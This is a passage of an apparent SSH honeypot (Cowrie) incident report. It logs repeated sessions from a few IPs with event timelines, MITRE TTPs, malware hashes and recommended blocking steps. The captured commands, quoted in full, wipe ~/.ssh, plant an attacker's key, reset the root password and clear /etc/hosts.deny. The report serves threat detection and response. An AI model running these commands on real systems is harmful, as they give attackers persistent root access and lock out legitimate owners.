| Field | Detail |
|---|---|
| **Source IP** | `14.103.102[.]130` |
| **First Seen** | 2026-05-20 21:11 |
| **Last Seen** | 2026-05-20 21:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:11:08` | `cowrie.session.connect` |
| `2026-05-20 21:11:08` | `cowrie.client.version` |
| `2026-05-20 21:11:09` | `cowrie.client.kex` |
| `2026-05-20 21:11:09` | `cowrie.login.success` |
| `2026-05-20 21:11:09` | `cowrie.session.params` |
| `2026-05-20 21:11:09` | `cowrie.command.input` |
| `2026-05-20 21:11:09` | `cowrie.command.failed` |
| `2026-05-20 21:11:10` | `cowrie.log.closed` |
| `2026-05-20 21:11:10` | `cowrie.session.params` |
| `2026-05-20 21:11:10` | `cowrie.command.input` |
| `2026-05-20 21:11:10` | `cowrie.session.file_download` |
| `2026-05-20 21:11:10` | `cowrie.log.closed` |
| `2026-05-20 21:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.102[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.102[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44bd837b5e44

| Field | Detail |
|---|---|
| **Source IP** | `14.103.102[.]130` |
| **First Seen** | 2026-05-20 21:11 |
| **Last Seen** | 2026-05-20 21:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:11:12` | `cowrie.session.connect` |
| `2026-05-20 21:11:12` | `cowrie.client.version` |
| `2026-05-20 21:11:12` | `cowrie.client.kex` |
| `2026-05-20 21:11:13` | `cowrie.login.success` |
| `2026-05-20 21:11:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.102[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.102[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-424ceaae7c21

| Field | Detail |
|---|---|
| **Source IP** | `14.103.102[.]130` |
| **First Seen** | 2026-05-20 21:12 |
| **Last Seen** | 2026-05-20 21:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:12:33` | `cowrie.session.connect` |
| `2026-05-20 21:12:33` | `cowrie.client.version` |
| `2026-05-20 21:12:33` | `cowrie.client.kex` |
| `2026-05-20 21:12:33` | `cowrie.login.success` |
| `2026-05-20 21:12:34` | `cowrie.session.params` |
| `2026-05-20 21:12:34` | `cowrie.command.input` |
| `2026-05-20 21:12:34` | `cowrie.command.failed` |
| `2026-05-20 21:12:34` | `cowrie.log.closed` |
| `2026-05-20 21:12:34` | `cowrie.session.params` |
| `2026-05-20 21:12:34` | `cowrie.command.input` |
| `2026-05-20 21:12:34` | `cowrie.session.file_download` |
| `2026-05-20 21:12:34` | `cowrie.log.closed` |
| `2026-05-20 21:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.102[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.102[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29a794351672

| Field | Detail |
|---|---|
| **Source IP** | `14.103.102[.]130` |
| **First Seen** | 2026-05-20 21:12 |
| **Last Seen** | 2026-05-20 21:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:12:36` | `cowrie.session.connect` |
| `2026-05-20 21:12:36` | `cowrie.client.version` |
| `2026-05-20 21:12:36` | `cowrie.client.kex` |
| `2026-05-20 21:12:37` | `cowrie.login.success` |
| `2026-05-20 21:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.102[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.102[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e99569337028

| Field | Detail |
|---|---|
| **Source IP** | `14.103.41[.]98` |
| **First Seen** | 2026-05-20 21:16 |
| **Last Seen** | 2026-05-20 21:16 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ZfZMdHUkA0av"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:16:05` | `cowrie.session.connect` |
| `2026-05-20 21:16:05` | `cowrie.client.version` |
| `2026-05-20 21:16:05` | `cowrie.client.kex` |
| `2026-05-20 21:16:06` | `cowrie.login.success` |
| `2026-05-20 21:16:07` | `cowrie.session.params` |
| `2026-05-20 21:16:07` | `cowrie.command.input` |
| `2026-05-20 21:16:07` | `cowrie.command.failed` |
| `2026-05-20 21:16:07` | `cowrie.log.closed` |
| `2026-05-20 21:16:08` | `cowrie.session.params` |
| `2026-05-20 21:16:08` | `cowrie.command.input` |
| `2026-05-20 21:16:08` | `cowrie.session.file_download` |
| `2026-05-20 21:16:08` | `cowrie.log.closed` |
| `2026-05-20 21:16:24` | `cowrie.session.params` |
| `2026-05-20 21:16:24` | `cowrie.command.input` |
| `2026-05-20 21:16:25` | `cowrie.log.closed` |
| `2026-05-20 21:16:25` | `cowrie.session.params` |
| `2026-05-20 21:16:25` | `cowrie.command.input` |
| `2026-05-20 21:16:25` | `cowrie.log.closed` |
| `2026-05-20 21:16:26` | `cowrie.session.params` |
| `2026-05-20 21:16:26` | `cowrie.command.input` |
| `2026-05-20 21:16:26` | `cowrie.session.file_download` |
| `2026-05-20 21:16:26` | `cowrie.log.closed` |
| `2026-05-20 21:16:27` | `cowrie.session.params` |
| `2026-05-20 21:16:27` | `cowrie.command.input` |
| `2026-05-20 21:16:27` | `cowrie.log.closed` |
| `2026-05-20 21:16:27` | `cowrie.session.params` |
| `2026-05-20 21:16:27` | `cowrie.command.input` |
| `2026-05-20 21:16:27` | `cowrie.log.closed` |
| `2026-05-20 21:16:28` | `cowrie.session.params` |
| `2026-05-20 21:16:28` | `cowrie.command.input` |
| `2026-05-20 21:16:28` | `cowrie.command.input` |
| `2026-05-20 21:16:28` | `cowrie.log.closed` |
| `2026-05-20 21:16:29` | `cowrie.session.params` |
| `2026-05-20 21:16:29` | `cowrie.command.input` |
| `2026-05-20 21:16:29` | `cowrie.log.closed` |
| `2026-05-20 21:16:30` | `cowrie.session.params` |
| `2026-05-20 21:16:30` | `cowrie.command.input` |
| `2026-05-20 21:16:30` | `cowrie.log.closed` |
| `2026-05-20 21:16:30` | `cowrie.session.params` |
| `2026-05-20 21:16:30` | `cowrie.command.input` |
| `2026-05-20 21:16:30` | `cowrie.log.closed` |
| `2026-05-20 21:16:31` | `cowrie.session.params` |
| `2026-05-20 21:16:31` | `cowrie.command.input` |
| `2026-05-20 21:16:31` | `cowrie.log.closed` |
| `2026-05-20 21:16:31` | `cowrie.session.params` |
| `2026-05-20 21:16:31` | `cowrie.command.input` |
| `2026-05-20 21:16:31` | `cowrie.log.closed` |
| `2026-05-20 21:16:32` | `cowrie.session.params` |
| `2026-05-20 21:16:32` | `cowrie.command.input` |
| `2026-05-20 21:16:32` | `cowrie.log.closed` |
| `2026-05-20 21:16:32` | `cowrie.session.params` |
| `2026-05-20 21:16:32` | `cowrie.command.input` |
| `2026-05-20 21:16:32` | `cowrie.log.closed` |
| `2026-05-20 21:16:32` | `cowrie.session.params` |
| `2026-05-20 21:16:32` | `cowrie.command.input` |
| `2026-05-20 21:16:33` | `cowrie.log.closed` |
| `2026-05-20 21:16:33` | `cowrie.session.params` |
| `2026-05-20 21:16:33` | `cowrie.command.input` |
| `2026-05-20 21:16:33` | `cowrie.log.closed` |
| `2026-05-20 21:16:33` | `cowrie.session.params` |
| `2026-05-20 21:16:33` | `cowrie.command.input` |
| `2026-05-20 21:16:33` | `cowrie.log.closed` |
| `2026-05-20 21:16:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.41[.]98` to AbuseIPDB if not already reported
- [ ] Block `14.103.41[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e68d48f6cf02

| Field | Detail |
|---|---|
| **Source IP** | `14.103.102[.]130` |
| **First Seen** | 2026-05-20 21:18 |
| **Last Seen** | 2026-05-20 21:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:18:11` | `cowrie.session.connect` |
| `2026-05-20 21:18:11` | `cowrie.client.version` |
| `2026-05-20 21:18:11` | `cowrie.client.kex` |
| `2026-05-20 21:18:12` | `cowrie.login.success` |
| `2026-05-20 21:18:12` | `cowrie.session.params` |
| `2026-05-20 21:18:12` | `cowrie.command.input` |
| `2026-05-20 21:18:12` | `cowrie.command.failed` |
| `2026-05-20 21:18:12` | `cowrie.log.closed` |
| `2026-05-20 21:18:12` | `cowrie.session.params` |
| `2026-05-20 21:18:12` | `cowrie.command.input` |
| `2026-05-20 21:18:12` | `cowrie.session.file_download` |
| `2026-05-20 21:18:12` | `cowrie.log.closed` |
| `2026-05-20 21:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.102[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.102[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1a52c0960f9

| Field | Detail |
|---|---|
| **Source IP** | `14.103.102[.]130` |
| **First Seen** | 2026-05-20 21:18 |
| **Last Seen** | 2026-05-20 21:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:18:14` | `cowrie.session.connect` |
| `2026-05-20 21:18:14` | `cowrie.client.version` |
| `2026-05-20 21:18:15` | `cowrie.client.kex` |
| `2026-05-20 21:18:15` | `cowrie.login.success` |
| `2026-05-20 21:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.102[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.102[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2190c708e8d

| Field | Detail |
|---|---|
| **Source IP** | `14.103.102[.]130` |
| **First Seen** | 2026-05-20 21:19 |
| **Last Seen** | 2026-05-20 21:19 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:19:34` | `cowrie.session.connect` |
| `2026-05-20 21:19:34` | `cowrie.client.version` |
| `2026-05-20 21:19:35` | `cowrie.client.kex` |
| `2026-05-20 21:19:35` | `cowrie.login.success` |
| `2026-05-20 21:19:35` | `cowrie.session.params` |
| `2026-05-20 21:19:35` | `cowrie.command.input` |
| `2026-05-20 21:19:35` | `cowrie.command.failed` |
| `2026-05-20 21:19:36` | `cowrie.log.closed` |
| `2026-05-20 21:19:36` | `cowrie.session.params` |
| `2026-05-20 21:19:36` | `cowrie.command.input` |
| `2026-05-20 21:19:36` | `cowrie.session.file_download` |
| `2026-05-20 21:19:36` | `cowrie.log.closed` |
| `2026-05-20 21:19:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.102[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.102[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b145d07be5e5

| Field | Detail |
|---|---|
| **Source IP** | `14.103.102[.]130` |
| **First Seen** | 2026-05-20 21:19 |
| **Last Seen** | 2026-05-20 21:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:19:44` | `cowrie.session.connect` |
| `2026-05-20 21:19:44` | `cowrie.client.version` |
| `2026-05-20 21:19:44` | `cowrie.client.kex` |
| `2026-05-20 21:19:45` | `cowrie.login.success` |
| `2026-05-20 21:19:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.102[.]130` to AbuseIPDB if not already reported
- [ ] Block `14.103.102[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f1f22913393

| Field | Detail |
|---|---|
| **Source IP** | `42.51.41[.]252` |
| **First Seen** | 2026-05-20 21:21 |
| **Last Seen** | 2026-05-20 21:22 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:HAkOyjtUcoc0"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:21:45` | `cowrie.session.connect` |
| `2026-05-20 21:21:45` | `cowrie.client.version` |
| `2026-05-20 21:21:45` | `cowrie.client.kex` |
| `2026-05-20 21:21:46` | `cowrie.login.success` |
| `2026-05-20 21:21:46` | `cowrie.session.params` |
| `2026-05-20 21:21:46` | `cowrie.command.input` |
| `2026-05-20 21:21:46` | `cowrie.command.failed` |
| `2026-05-20 21:21:46` | `cowrie.log.closed` |
| `2026-05-20 21:21:46` | `cowrie.session.params` |
| `2026-05-20 21:21:46` | `cowrie.command.input` |
| `2026-05-20 21:21:47` | `cowrie.session.file_download` |
| `2026-05-20 21:21:47` | `cowrie.log.closed` |
| `2026-05-20 21:21:59` | `cowrie.session.params` |
| `2026-05-20 21:21:59` | `cowrie.command.input` |
| `2026-05-20 21:21:59` | `cowrie.log.closed` |
| `2026-05-20 21:21:59` | `cowrie.session.params` |
| `2026-05-20 21:21:59` | `cowrie.command.input` |
| `2026-05-20 21:22:00` | `cowrie.log.closed` |
| `2026-05-20 21:22:00` | `cowrie.session.params` |
| `2026-05-20 21:22:00` | `cowrie.command.input` |
| `2026-05-20 21:22:00` | `cowrie.session.file_download` |
| `2026-05-20 21:22:00` | `cowrie.log.closed` |
| `2026-05-20 21:22:00` | `cowrie.session.params` |
| `2026-05-20 21:22:00` | `cowrie.command.input` |
| `2026-05-20 21:22:01` | `cowrie.log.closed` |
| `2026-05-20 21:22:01` | `cowrie.session.params` |
| `2026-05-20 21:22:01` | `cowrie.command.input` |
| `2026-05-20 21:22:01` | `cowrie.log.closed` |
| `2026-05-20 21:22:02` | `cowrie.session.params` |
| `2026-05-20 21:22:02` | `cowrie.command.input` |
| `2026-05-20 21:22:02` | `cowrie.command.input` |
| `2026-05-20 21:22:02` | `cowrie.log.closed` |
| `2026-05-20 21:22:02` | `cowrie.session.params` |
| `2026-05-20 21:22:02` | `cowrie.command.input` |
| `2026-05-20 21:22:02` | `cowrie.log.closed` |
| `2026-05-20 21:22:03` | `cowrie.session.params` |
| `2026-05-20 21:22:03` | `cowrie.command.input` |
| `2026-05-20 21:22:03` | `cowrie.log.closed` |
| `2026-05-20 21:22:03` | `cowrie.session.params` |
| `2026-05-20 21:22:03` | `cowrie.command.input` |
| `2026-05-20 21:22:03` | `cowrie.log.closed` |
| `2026-05-20 21:22:04` | `cowrie.session.params` |
| `2026-05-20 21:22:04` | `cowrie.command.input` |
| `2026-05-20 21:22:04` | `cowrie.log.closed` |
| `2026-05-20 21:22:04` | `cowrie.session.params` |
| `2026-05-20 21:22:04` | `cowrie.command.input` |
| `2026-05-20 21:22:05` | `cowrie.log.closed` |
| `2026-05-20 21:22:05` | `cowrie.session.params` |
| `2026-05-20 21:22:05` | `cowrie.command.input` |
| `2026-05-20 21:22:05` | `cowrie.log.closed` |
| `2026-05-20 21:22:05` | `cowrie.session.params` |
| `2026-05-20 21:22:05` | `cowrie.command.input` |
| `2026-05-20 21:22:06` | `cowrie.log.closed` |
| `2026-05-20 21:22:06` | `cowrie.session.params` |
| `2026-05-20 21:22:06` | `cowrie.command.input` |
| `2026-05-20 21:22:06` | `cowrie.log.closed` |
| `2026-05-20 21:22:07` | `cowrie.session.params` |
| `2026-05-20 21:22:07` | `cowrie.command.input` |
| `2026-05-20 21:22:07` | `cowrie.log.closed` |
| `2026-05-20 21:22:07` | `cowrie.session.params` |
| `2026-05-20 21:22:07` | `cowrie.command.input` |
| `2026-05-20 21:22:07` | `cowrie.log.closed` |
| `2026-05-20 21:22:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.41[.]252` to AbuseIPDB if not already reported
- [ ] Block `42.51.41[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39d4b1112198

| Field | Detail |
|---|---|
| **Source IP** | `42.51.41[.]252` |
| **First Seen** | 2026-05-20 21:30 |
| **Last Seen** | 2026-05-20 21:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:30:27` | `cowrie.session.connect` |
| `2026-05-20 21:30:27` | `cowrie.client.version` |
| `2026-05-20 21:30:27` | `cowrie.client.kex` |
| `2026-05-20 21:30:27` | `cowrie.login.success` |
| `2026-05-20 21:30:28` | `cowrie.session.params` |
| `2026-05-20 21:30:28` | `cowrie.command.input` |
| `2026-05-20 21:30:28` | `cowrie.command.failed` |
| `2026-05-20 21:30:28` | `cowrie.log.closed` |
| `2026-05-20 21:30:28` | `cowrie.session.params` |
| `2026-05-20 21:30:28` | `cowrie.command.input` |
| `2026-05-20 21:30:28` | `cowrie.session.file_download` |
| `2026-05-20 21:30:28` | `cowrie.log.closed` |
| `2026-05-20 21:30:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.41[.]252` to AbuseIPDB if not already reported
- [ ] Block `42.51.41[.]252` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a46c47615d74

| Field | Detail |
|---|---|
| **Source IP** | `42.51.41[.]252` |
| **First Seen** | 2026-05-20 21:30 |
| **Last Seen** | 2026-05-20 21:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:30:31` | `cowrie.session.connect` |
| `2026-05-20 21:30:31` | `cowrie.client.version` |
| `2026-05-20 21:30:31` | `cowrie.client.kex` |
| `2026-05-20 21:30:31` | `cowrie.login.success` |
| `2026-05-20 21:30:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.51.41[.]252` to AbuseIPDB if not already reported
- [ ] Block `42.51.41[.]252` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8b15ef311e2

| Field | Detail |
|---|---|
| **Source IP** | `42.51.41[.]252` |
| **First Seen** | 2026-05-20 21:31 |
| **Last Seen** | 2026-05-20 21:32 |
| **Session Duration** | 64s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
